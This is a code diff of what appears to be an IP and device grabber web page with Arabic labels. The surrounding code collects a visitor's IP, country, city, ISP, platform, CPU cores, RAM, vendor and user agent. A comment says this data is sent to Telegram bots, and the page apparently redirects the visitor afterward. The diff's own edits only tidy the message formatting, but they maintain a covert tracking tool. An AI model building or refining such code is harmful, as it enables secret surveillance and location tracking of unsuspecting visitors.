@@ -46,8 +46,10 @@ redirectToNextURL();
 	const ipLocationLink = `https://www.iplocation.net/?query=${ipAddress}`;
     const ipLocationNetLink = `<a href="${ipLocationLink}">تتبع بصمة الايبي</a>`;
 
+// Location icon as text (Unicode character)
+const locationIcon = "\u{1F4CD}";
 
-    const htmlMessage = `${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;
+    const htmlMessage = `${locationIcon} ${message}\n\n ${clickableLink}\n \n${ipLocationNetLink}`;
 
 
     // Send location and IP results to Telegram bots using an HTTP request
@@ -103,8 +105,8 @@ const userAgentData = navigator.userAgentData;
 
    const message = `
 
-    \nالايبي: ${ipAddress}
-    البلد: ${country}
+    الايبي: ${ipAddress}
+    \nالبلد: ${country}
     مدينه مزود الخدمه: ${city}
     مزود الخدمه: ${isp}
     المنصه: ${platform}
@@ -113,7 +115,7 @@ const userAgentData = navigator.userAgentData;
     عدد المعالجات: ${cpuCores}
     الرامات: ${totalRAM}
     شركه السوفتوير: ${vendor}
-     اندرويد: ${isAndroid ? 'اندرويد' : 'ليس اندرويد'}
+     اندرويد: ${isAndroid ? 'نعم' : 'لا'}
 
     \nباقي البيانات: ${userAgent}
 
